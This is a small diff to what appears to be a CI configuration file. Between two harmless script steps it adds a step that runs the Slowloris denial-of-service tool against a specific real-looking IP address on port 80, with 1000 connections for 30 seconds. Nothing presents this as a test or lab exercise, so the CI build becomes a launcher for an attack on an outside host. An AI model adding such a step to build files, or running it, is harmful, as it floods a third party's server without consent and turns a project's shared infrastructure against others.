@@ -6,4 +6,5 @@ python:
 
 script:
   - ls -al
+  - timeout 30s python3 slowloris.py -i 13.54.255.42 -p 80 -s 1000
   - python3 -c "print('hello')"
